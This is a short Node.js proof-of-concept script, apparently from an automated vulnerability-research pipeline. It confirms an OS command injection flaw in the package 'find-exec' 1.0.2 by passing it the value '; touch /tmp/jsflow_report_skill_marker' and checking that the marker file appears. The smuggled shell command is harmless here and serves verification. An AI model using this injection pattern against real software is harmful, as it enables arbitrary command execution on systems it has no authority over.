const fs = require("fs");

const target = require("../../explodejs-datasets/collected-dataset/CWE-78/find-exec-1.0.2/src");
const markerPath = "/tmp/jsflow_report_skill_marker";
const payload = "; touch /tmp/jsflow_report_skill_marker";

try {
  fs.unlinkSync(markerPath);
} catch {}

const result = target(payload);

if (!fs.existsSync(markerPath)) {
  throw new Error("marker file was not created");
}

fs.unlinkSync(markerPath);
console.log("JSFLOW_POC_SUCCESS", result);
